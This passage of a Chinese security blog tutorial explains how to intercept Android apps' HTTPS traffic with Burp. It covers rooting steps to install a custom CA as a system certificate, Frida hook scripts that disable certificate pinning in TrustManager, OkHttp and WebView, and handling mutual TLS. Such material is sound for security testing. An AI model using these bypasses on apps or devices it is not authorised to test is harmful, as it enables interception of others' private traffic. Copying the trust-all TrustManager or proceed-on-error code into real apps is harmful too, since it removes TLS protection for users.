rel="noopener">参考Android开发文档</a>，<strong>当app支持的最小API为24（Android 7.0）或以上时</strong>(并非7.0以上的手机)，默认情况下app只信任系统级别的CA，这样从sdcard安装Burp证书将无法拦截应用流量，于是就需要把burp证书变为系统证书。<br>这里有两种方法可以帮我们绕过：<br>1.将Burp CA作为系统级CA安装在设备上。这是最简单的解决方法，但需要root<br>2.修改manifest文件并重打包，比较麻烦，但无需root。</p><p>这里介绍一下第1种方法。</p><h4 id="（2）root下导入证书为系统证书"><a href="#（2）root下导入证书为系统证书" class="headerlink" title="（2）root下导入证书为系统证书"></a>（2）root下导入证书为系统证书</h4><p>(本文由于时间过长，可以在最新版本系统上遇到其他问题，Android 10/11可以参考<a href="https://pswalia2u.medium.com/install-burpsuites-or-any-ca-certificate-to-system-store-in-android-10-and-11-38e508a5541a" target="_blank" rel="noopener">https://pswalia2u.medium.com/install-burpsuites-or-any-ca-certificate-to-system-store-in-android-10-and-11-38e508a5541a</a>)</p><p>有root的前提下，可以把我们自己的证书安装成系统证书，主要步骤如下：</p><ul><li><p>1.转为PEM格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in burp.der -out burp.pem</span><br></pre></td></tr></table></figure></li><li><p>2.计算证书哈希值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform PEM -subject_hash_old -in burp.pem|head -1</span><br></pre></td></tr></table></figure></li></ul><p>假设结果是80326040，则我们把证书重命名为80326040.0。</p><ul><li><p>3.把/system mount成为可读可写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mount -o rw,remount /system</span><br><span class="line">/*如果失败，尝试关闭dm_verity</span><br><span class="line">$ adb remount</span><br><span class="line">dm_verity is enabled on the system partition.</span><br><span class="line">Use &quot;adb disable-verity&quot; to disable verity.</span><br><span class="line">If you do not, remount may succeed, however, you will still not be able to write to these volumes.</span><br><span class="line">remount succeeded</span><br><span class="line">$ adb disable-verity</span><br><span class="line">Verity disabled on /system</span><br><span class="line">Now reboot your device for settings to take effect</span><br><span class="line">$ adb reboot</span><br><span class="line">$ adb root</span><br><span class="line">restarting adbd as root</span><br><span class="line">$ adb remount</span><br><span class="line">remount succeeded</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></li><li><p>4.把80326040.0拷贝到Android的路径/system/etc/security/cacerts/下，添加644权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 644 80326040.0</span><br><span class="line">chown root:root 80326040.0</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure></li><li><p>5.重启手机后生效（切记）</p></li></ul><p>Android的系统证书路径为<strong>“/system/etc/security/cacerts/”</strong>，用户证书路径为<strong>“/data/misc/user/0/cacerts-added”</strong>，所以把用户证书move到系统证书路径也是可以的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mount -o rw,remount /system</span><br><span class="line">mv /data/misc/user/0/cacerts-added/xxxx.0 /system/etc/security/cacerts/</span><br><span class="line">chmod 644 xxxx.0</span><br><span class="line">chown root:root xxxx.0</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure></p><p>Magisk有一个插件叫movecert(<a href="https://github.com/Magisk-Modules-Repo/movecert),其原理就是如此。所以不想那么复杂，直接安装Magisk的这个模块后，导入用户证书后重启手机即可变为系统证书。" target="_blank" rel="noopener">https://github.com/Magisk-Modules-Repo/movecert),其原理就是如此。所以不想那么复杂，直接安装Magisk的这个模块后，导入用户证书后重启手机即可变为系统证书。</a></p><p>(另外一个插件<a href="https://github.com/NVISO-BE/MagiskTrustUserCerts" target="_blank" rel="noopener">https://github.com/NVISO-BE/MagiskTrustUserCerts</a>)</p><h4 id="（3）证书有效期过长的问题"><a href="#（3）证书有效期过长的问题" class="headerlink" title="（3）证书有效期过长的问题"></a>（3）证书有效期过长的问题</h4><p>然而，我在oneplus 5T 和HTC的手机（均为8.0以上系统）通过导入burp证书为系统证书，仍然无法抓到https数据，浏览器报<strong>“NET::ERR_CERT_VALIDITY_TOO_LONG”</strong>错误，这是为什么呢？</p><p>原因是chrome从2018年开始只信任有效期少于825天（27个月）的证书（参考<a href="https://www.ssl.com/blogs/ssl-certificate-maximum-duration-825-days/），而burp发行的root证书有效期远大于27个月，在Android" target="_blank" rel="noopener">https://www.ssl.com/blogs/ssl-certificate-maximum-duration-825-days/），而burp发行的root证书有效期远大于27个月，在Android</a> 7以上，即使把burp的自定义证书添加进系统证书里（<strong>但用户证书并不会检测这个有效期是否太长</strong>），这个证书也是不工作的，所以chrome会判定这个证书无效，报ERR_CERT_VALIDITY_TOO_LONG的错误。</p><p>解决的办法是自己做一个低于27个月的root证书导入burp，再通过burp重新导出证书放到系统证书路径下。这也是在（1）和（2）都无法抓包的条件下的终极解决方案。</p><p>下面来介绍如何生成root CA证书：</p><ol><li><p>生成密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out key.pem 3072 -nodes</span><br></pre></td></tr></table></figure></li><li><p>下载openssl.cnf (OpenSSL example configuration file,下载链接：<a href="https://gist.github.com/nevermoe/f1a4bbcd9cf76143e9520c717caff306" target="_blank" rel="noopener">https://gist.github.com/nevermoe/f1a4bbcd9cf76143e9520c717caff306</a>) 并使用如下命令生成证书：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -key key.pem -sha256 -config openssl.cnf -out cert.pem -days 730 -subj &quot;/C=JP/ST=/L=/O=m4bln/CN=MY CA&quot;</span><br></pre></td></tr></table></figure></li><li><p>把密钥和证书导出成pfx格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -inkey key.pem -in cert.pem -out cert_and_key.pfx</span><br></pre></td></tr></table></figure></li><li><p>把cert_and_key.pfx导入burp<br><img src="/images/pasted-191.png" alt="upload successful"><br>注意：需要输入创建时的密码</p></li><li>导出证书，并按照（2）中的方法把导出证书变为系统证书。</li></ol><p><img src="/images/pasted-192.png" alt="upload successful"></p><p>需要注意的是自签名的root证书一定要有x509v3 extesion，其中包含了CA： True这个属性，不然我们生成的证书是无法导入成系统证书的。</p><p>至此，依靠系统或默认浏览器校验证书的抓包方法就到此为止了，为了更清楚的搞清楚各种方法的使用场景，这里简单总结一下：</p><ul><li>在依靠系统或默认浏览器校验证书的情况下，导入burp证书为用户证书是可以抓https包的</li><li>当app支持的最小API为24（Android 7.0）或以上时，默认情况下app只信任系统级别的证书，需要把burp变为系统证书</li><li>自签名证书作为系统证书时，有效期最长不超过825天，用户证书则没有限制</li></ul><p>总之，如果不想那么麻烦的话，不妨直接采用方案（3）作为终极方案。</p><h3 id="2-APP自己校验证书（SSL-Pinning）"><a href="#2-APP自己校验证书（SSL-Pinning）" class="headerlink" title="2. APP自己校验证书（SSL Pinning）"></a>2. APP自己校验证书（SSL Pinning）</h3><p>如果APP自己实现证书校验时，证书验证的逻辑在app内部，与系统和浏览器无关，因此导入为用户证书或系统证书都解决不了问题。</p><p>APP自己校验证书，通常会把自己的证书或证书的hash值内置在APK安装包内，在发请求时app自身通过代码来校验证书和服务器的关系，即证书绑定(也叫Certificate Pinning或SSL Pinning)。</p><p>这种情况下如果想抓https数据包，我们有两种解决办法：</p><ol><li>替换证书或证书的hash</li><li>通过hook绕过证书的校验逻辑</li></ol><p>由于方案一需要找到证书的位置或hash值所在的代码片段，并进行重打包和签名，操作起来比较复杂且不通用，这里我们主要采用方案2。</p><p>通过hook绕过ssl pinning(即ssl unpinning)比较成熟的工具主要有JustTrustMe（<a href="https://github.com/Fuzion24/JustTrustMe）和DroidSSLUnpinning（https://github.com/WooyunDota/DroidSSLUnpinning）。二者的原理均为hook常用证书校验的API，不同的是前者基于Xposed，后者基于Frida。" target="_blank" rel="noopener">https://github.com/Fuzion24/JustTrustMe）和DroidSSLUnpinning（https://github.com/WooyunDota/DroidSSLUnpinning）。二者的原理均为hook常用证书校验的API，不同的是前者基于Xposed，后者基于Frida。</a></p><p>下边我们基于Android中常见的证书绑定的的实现，来讨论绕过方法。</p><h4 id="证书绑定实例及绕过方法"><a href="#证书绑定实例及绕过方法" class="headerlink" title="证书绑定实例及绕过方法"></a>证书绑定实例及绕过方法</h4><h6 id="（1）使用TrustManager"><a href="#（1）使用TrustManager" class="headerlink" title="（1）使用TrustManager"></a>（1）使用TrustManager</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TrustManager[] trustAllCerts = new TrustManager[] &#123;</span><br><span class="line">    new X509TrustManager() &#123;</span><br><span class="line">        public java.security.cert.X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        public void checkClientTrusted(X509Certificate[] certs, String authType) &#123;  &#125;</span><br><span class="line"></span><br><span class="line">        public void checkServerTrusted(X509Certificate[] certs, String authType) &#123;  &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>TrustManager是android用来处理证书的一个类，其子类X509TrustManager实现了各种校验。它会被SSLcontext的init函数调用并传给上层处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSLContext sslContext = SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line">sslContext.init(null, trustManagerFactory.getTrustManagers(), new SecureRandom());</span><br><span class="line">return sslContext.getSocketFactory();</span><br></pre></td></tr></table></figure></p><p>因此，通过hookSSLcontext的init函数，传递一个没有内容的TrustManager即可绕过，DroidSSLUnpinning的绕过代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// Prepare the TrustManagers array to pass to SSLContext.init()</span><br><span class="line">var X509Certificate = Java.use(&quot;java.security.cert.X509Certificate&quot;);</span><br><span class="line">var TrustManager;</span><br><span class="line">try &#123;</span><br><span class="line">    TrustManager = Java.registerClass(&#123;</span><br><span class="line">        name: &apos;org.wooyun.TrustManager&apos;,</span><br><span class="line">        implements: [X509TrustManager],</span><br><span class="line">        methods: &#123;</span><br><span class="line">            checkClientTrusted: function (chain, authType) &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            checkServerTrusted: function (chain, authType) &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            getAcceptedIssuers: function () &#123;</span><br><span class="line">                // var certs = [X509Certificate.$new()];</span><br><span class="line">                // return certs;</span><br><span class="line">                return [];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">    quiet_send(&quot;registerClass from X509TrustManager &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot; + e.message);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Prepare the TrustManagers array to pass to SSLContext.init()</span><br><span class="line">var TrustManagers = [TrustManager.$new()];</span><br><span class="line">try &#123;</span><br><span class="line">    // Prepare a Empty SSLFactory</span><br><span class="line">    var TLS_SSLContext = SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line">    TLS_SSLContext.init(null,TrustManagers,null);</span><br><span class="line">    var EmptySSLFactory = TLS_SSLContext.getSocketFactory();</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">    quiet_send(e.message);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// hook init() of SSLContext</span><br><span class="line">var SSLContext = Java.use(&apos;javax.net.ssl.SSLContext&apos;);</span><br><span class="line">var SSLContext_init = SSLContext.init.overload(</span><br><span class="line">    &apos;[Ljavax.net.ssl.KeyManager;&apos;, &apos;[Ljavax.net.ssl.TrustManager;&apos;, &apos;java.security.SecureRandom&apos;);</span><br><span class="line"></span><br><span class="line">// Override the init method, specifying our new TrustManager</span><br><span class="line">SSLContext_init.implementation = function (keyManager, trustManager, secureRandom) &#123;</span><br><span class="line"></span><br><span class="line">    quiet_send(&apos;Overriding SSLContext.init() with the custom TrustManager&apos;);</span><br><span class="line"></span><br><span class="line">    SSLContext_init.call(this, null, TrustManagers, null);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h6 id="（2）使用Okhttp的CertificatePinner"><a href="#（2）使用Okhttp的CertificatePinner" class="headerlink" title="（2）使用Okhttp的CertificatePinner"></a>（2）使用Okhttp的CertificatePinner</h6><p>绑定域名和证书的hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">val certificatePinner = CertificatePinner.Builder()</span><br><span class="line">       .add(</span><br><span class="line">               &quot;www.example.com&quot;,</span><br><span class="line">               &quot;sha256/ZC3lTYTDBJQVf1P2V7+fibTqbIsWNR/X7CWNVW+CEEA=&quot;</span><br><span class="line">       ).build()</span><br><span class="line"></span><br><span class="line">val okHttpClient = OkHttpClient.Builder()</span><br><span class="line">       .certificatePinner(certificatePinner)</span><br><span class="line">       .build()</span><br></pre></td></tr></table></figure></p><p>DroidSSLUnpinning的绕过代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">/*** okhttp3.x unpinning ***/</span><br><span class="line">var CertificatePinner = Java.use(&apos;okhttp3.CertificatePinner&apos;);</span><br><span class="line"></span><br><span class="line">    quiet_send(&apos;OkHTTP 3.x Found&apos;);</span><br><span class="line"></span><br><span class="line">    CertificatePinner.check.overload(&apos;java.lang.String&apos;, &apos;java.util.List&apos;).implementation = function () &#123;</span><br><span class="line"></span><br><span class="line">        quiet_send(&apos;OkHTTP 3.x check() called. Not throwing an exception.&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">/*** okhttp unpinning ***/    </span><br><span class="line">    var OkHttpClient = Java.use(&quot;com.squareup.okhttp.OkHttpClient&quot;);</span><br><span class="line">    OkHttpClient.setCertificatePinner.implementation = function(certificatePinner)&#123;</span><br><span class="line">        // do nothing</span><br><span class="line">        quiet_send(&quot;OkHttpClient.setCertificatePinner Called!&quot;);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Invalidate the certificate pinnet checks (if &quot;setCertificatePinner&quot; was called before the previous invalidation)</span><br><span class="line">    var CertificatePinner = Java.use(&quot;com.squareup.okhttp.CertificatePinner&quot;);</span><br><span class="line">    CertificatePinner.check.overload(&apos;java.lang.String&apos;, &apos;[Ljava.security.cert.Certificate;&apos;).implementation = function(p0, p1)&#123;</span><br><span class="line">        // do nothing</span><br><span class="line">        quiet_send(&quot;okhttp Called! [Certificate]&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;;</span><br><span class="line">    CertificatePinner.check.overload(&apos;java.lang.String&apos;, &apos;java.util.List&apos;).implementation = function(p0, p1)&#123;</span><br><span class="line">        // do nothing</span><br><span class="line">        quiet_send(&quot;okhttp Called! [List]&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p><h6 id="（3）Manifest中配置networkSecurityConfig（Android-7-0以上）"><a href="#（3）Manifest中配置networkSecurityConfig（Android-7-0以上）" class="headerlink" title="（3）Manifest中配置networkSecurityConfig（Android 7.0以上）"></a>（3）Manifest中配置networkSecurityConfig（Android 7.0以上）</h6><ol><li><p>创建res/xml/network_security_config.xml，并在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;network-security-config&gt;</span><br><span class="line">   &lt;domain-config&gt;</span><br><span class="line">       &lt;domain includeSubdomains=&quot;true&quot;&gt;example.com&lt;/domain&gt;</span><br><span class="line">       &lt;pin-set&gt;</span><br><span class="line">           &lt;pin digest=&quot;SHA-256&quot;&gt;ZC3lTYTDBJQVf1P2V7+fibTqbIsWNR/X7CWNVW+CEEA=&lt;/pin&gt;</span><br><span class="line">           &lt;pin digest=&quot;SHA-256&quot;&gt;GUAL5bejH7czkXcAeJ0vCiRxwMnVBsDlBMBsFtfLF8A=&lt;/pin&gt;</span><br><span class="line">       &lt;/pin-set&gt;</span><br><span class="line">   &lt;/domain-config&gt;</span><br><span class="line">&lt;/network-security-config&gt;</span><br></pre></td></tr></table></figure></li><li><p>在manifest.xml文件中添加配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;manifest</span><br><span class="line">   xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">   package=&quot;co.netguru.demoapp&quot;&gt;</span><br><span class="line">   &lt;application</span><br><span class="line">       android:networkSecurityConfig=&quot;@xml/network_security_config&quot;&gt;</span><br><span class="line">       ...</span><br><span class="line">   &lt;/application&gt;</span><br><span class="line">&lt;/manifest..</span><br></pre></td></tr></table></figure></li></ol><p>DroidSSLUnpinning的绕过代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var TrustManagerImpl = Java.use(&quot;com.android.org.conscrypt.TrustManagerImpl&quot;);</span><br><span class="line">TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) &#123;</span><br><span class="line">    quiet_send(&quot;TrustManagerImpl verifyChain called&quot;);</span><br><span class="line">    return untrustedChain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var OpenSSLSocketImpl = Java.use(&apos;com.android.org.conscrypt.OpenSSLSocketImpl&apos;);</span><br><span class="line">OpenSSLSocketImpl.verifyCertificateChain.implementation = function (certRefs, authMethod) &#123;</span><br><span class="line">    quiet_send(&apos;OpenSSLSocketImpl.verifyCertificateChain&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h6 id="（4）WebView绑定证书"><a href="#（4）WebView绑定证书" class="headerlink" title="（4）WebView绑定证书"></a>（4）WebView绑定证书</h6><p>在WebViewClient类中的onReceivedSslError回调中实现校验逻辑</p><p>代码来自<a href="https://blog.csdn.net/lsyz0021/article/details/54669914" target="_blank" rel="noopener">https://blog.csdn.net/lsyz0021/article/details/54669914</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">1.实现证书校验函数</span><br><span class="line"></span><br><span class="line">    public static boolean isSSLCertOk(SslCertificate cert, String sha256Str) &#123;</span><br><span class="line">        byte[] SSLSHA256 = hexToBytes(sha256Str);</span><br><span class="line">        Bundle bundle = SslCertificate.saveState(cert);</span><br><span class="line">        if (bundle != null) &#123;</span><br><span class="line">            byte[] bytes = bundle.getByteArray(&quot;x509-certificate&quot;);</span><br><span class="line">            if (bytes != null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    CertificateFactory cf = CertificateFactory.getInstance(&quot;X.509&quot;);</span><br><span class="line">                    Certificate ca = cf.generateCertificate(new ByteArrayInputStream(bytes));</span><br><span class="line">                    MessageDigest sha256 = MessageDigest.getInstance(&quot;SHA-256&quot;);</span><br><span class="line">                    byte[] key = sha256.digest(((X509Certificate) ca).getEncoded());</span><br><span class="line">                    return Arrays.equals(key, SSLSHA256);</span><br><span class="line">                &#125; catch (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.onReceivedSslError回调中调用校验函数</span><br><span class="line">webView.setWebViewClient(new WebViewClient() &#123;</span><br><span class="line">@Override</span><br><span class="line">public void onReceivedSslErroronReceivedSslError回调中实现校验逻辑(WebView view, SslErrorHandler handler, SslError error) &#123;</span><br><span class="line">if (error.getPrimaryError() == SslError.SSL_INVALID) &#123;</span><br><span class="line">// 如果手动校验sha256成功就允许加载页面</span><br><span class="line">if (SSLCertUtil.isSSLCertOk(error.getCertificate(), &quot;6683c9584b8287ec3a50e312f4a540c79938aaeb76bd02e40a9ca037ee5d24f4&quot;)) &#123;</span><br><span class="line">handler.proceed();//验证通过</span><br><span class="line">&#125; else &#123;</span><br><span class="line">//证书验证失败</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">handler.cancel();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>DroidSSLUnpinning的绕过代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var WebViewClient = Java.use(&quot;android.webkit.WebViewClient&quot;);</span><br><span class="line"></span><br><span class="line">WebViewClient.onReceivedSslError.implementation = function (webView,sslErrorHandler,sslError)&#123;</span><br><span class="line">    quiet_send(&quot;WebViewClient onReceivedSslError invoke&quot;);</span><br><span class="line">    //执行proceed方法</span><br><span class="line">    sslErrorHandler.proceed();</span><br><span class="line">    return ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">WebViewClient.onReceivedError.overload(&apos;android.webkit.WebView&apos;, &apos;int&apos;, &apos;java.lang.String&apos;, &apos;java.lang.String&apos;).implementation = function (a,b,c,d)&#123;</span><br><span class="line">    quiet_send(&quot;WebViewClient onReceivedError invoked&quot;);</span><br><span class="line">    return ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">WebViewClient.onReceivedError.overload(&apos;android.webkit.WebView&apos;, &apos;android.webkit.WebResourceRequest&apos;, &apos;android.webkit.WebResourceError&apos;).implementation = function ()&#123;</span><br><span class="line">    quiet_send(&quot;WebViewClient onReceivedError invoked&quot;);</span><br><span class="line">    return ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>还有其他几种用法这里不再一一介绍，详情可以参考DroidSSLUnpinning的代码注释部分。</p><h3 id="3-https双向证书校验"><a href="#3-https双向证书校验" class="headerlink" title="3. https双向证书校验"></a>3. https双向证书校验</h3><p>https双向校验是指APP除了校验服务端的证书，服务端还会校验APP的证书。对于双向校验。https双向证书校验在实际中几乎很少用到，因为服务器端需要维护所有客户端的证书，这无疑增加了很多消耗，因此大部分厂商选择使用单向证书绑定。</p><p>双向认证需要完成两个环节：</p><h5 id="1-让客户端认为burp是服务端"><a href="#1-让客户端认为burp是服务端" class="headerlink" title="(1)让客户端认为burp是服务端"></a>(1)让客户端认为burp是服务端</h5><p>这一步其实就是破解Certificate Pinning，方法和上述过程完全相同。</p><h5 id="2-让服务端认为burp是客户端"><a href="#2-让服务端认为burp是客户端" class="headerlink" title="(2)让服务端认为burp是客户端"></a>(2)让服务端认为burp是客户端</h5><p>这一步需要导入客户端的证书到burp,客户端的证书一定会存在本地代码中，而且还可能会有密码，这种情况下需要逆向客户端app，找到证书和密码，并转为pkcs12格式导入到burp。</p><p>User options -&gt; SSL -&gt; Client SSL Certificate</p><p><img src="/images/pasted-193.png" alt="upload successful"></p><p>这样下来就可以双向抓包了。</p><h3 id="使用ssl-logger"><a href="#使用ssl-logger" class="headerlink" title="使用ssl_logger"></a>使用ssl_logger</h3><p>至此，我们可以绕过证书绑定，抓APP发出的https包了，然而上述的证书解绑hook工具仅仅是通过hook了几种绑定证书的API，不适用于新出现或者非主流的证书绑定技术。当折腾半天都搞不定证书绑定时，这时候就需要神器 —— ssl_logger。</p><p>ssl_logger(<a href="https://github.com/google/ssl_logger)是用来解密SSL流量的工具，它也是一款基于frida的hook工具，通过hook" target="_blank" rel="noopener">https://github.com/google/ssl_logger)是用来解密SSL流量的工具，它也是一款基于frida的hook工具，通过hook</a> libssl库中的SSL_read、SSL_write等函数来实现流量解密。由于底层的实现会调用这几个函数来封装，所以可以直接解出流量数据。</p><p>全球知名黑客5alt大佬对ssl_logger进行了修改，使之在Android设备上的使用更加友好，参考 <a href="https://github.com/5alt/ssl_logger。" target="_blank" rel="noopener">https://github.com/5alt/ssl_logger。</a></p><p>使用ssl_logger无需安装burp的中间人攻具的证书就可以抓https流量，但和burp相比，其重放、修改等功能会受限。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>特定的工具、特定的app等特殊情况的案例会不定期粘贴在下边：</p><p>1.<a href="https://plainsec.org/how-to-bypass-instagram-ssl-pinning-on-android-v78/" target="_blank" rel="noopener">How to bypass Instagram SSL Pinning on Android </a><br>2.<a href="https://github.com/shroudedcode/apk-mitm" target="_blank" rel="noopener">apk-mitm 通过重打包使APP信任用户证书</a></p><p>参考资料：</p><ol><li><a href="https://github.com/WooyunDota/DroidSSLUnpinning" target="_blank" rel="noopener">https://github.com/WooyunDota/DroidSSLUnpinning</a> </li><li><a href="https://xz.aliyun.com/t/2336" target="_blank" rel="noopener">https://xz.aliyun.com/t/2336</a> Frida.Android.Practice (ssl unpinning)</li><li><a 